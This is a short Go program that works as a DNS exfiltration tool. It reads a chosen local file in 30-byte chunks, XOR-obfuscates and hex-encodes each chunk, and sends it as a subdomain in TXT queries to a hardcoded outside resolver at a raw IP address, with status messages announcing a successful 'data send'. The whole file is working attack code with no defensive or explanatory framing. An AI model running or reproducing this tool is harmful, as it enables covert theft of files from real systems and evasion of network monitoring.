package main

import (
	"context"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"time"
)

func xor(buf []byte, xorchar byte) []byte {
	res := make([]byte, len(buf))
	for i := 0; i < len(buf); i++ {
		res[i] = xorchar ^ buf[i]
	}
	return res
}

func main() {
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(10000),
			}

			return d.DialContext(ctx, "udp", "185.170.212.179:53")
		},
	}

	var file = flag.String("f", "", "insert local file to exfilter")

	flag.Parse()

	fmt.Printf("checking data [+].... \n")

	f, err := os.Open(*file)
	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	dataBytes := make([]byte, 30)

	i := 0

	for i == 0 {
		dataBytes = dataBytes[:cap(dataBytes)]

		bytesRead, err := f.Read(dataBytes)

		fmt.Println(bytesRead)
		if err != nil {
			if err == io.EOF {
				break
			}

			log.Fatal(err)
		}

		dataBytes = dataBytes[:bytesRead]

		code := xor(dataBytes, 87)
		// sdasdsadasdasdasdasdasdsad.google.com
		hexString := hex.EncodeToString(code) + ".google.com"
		time.Sleep(2 * time.Second)
		r.LookupTXT(context.Background(), hexString)
		fmt.Println(hexString)

	}

	fmt.Println("successfull data send [+]")

}
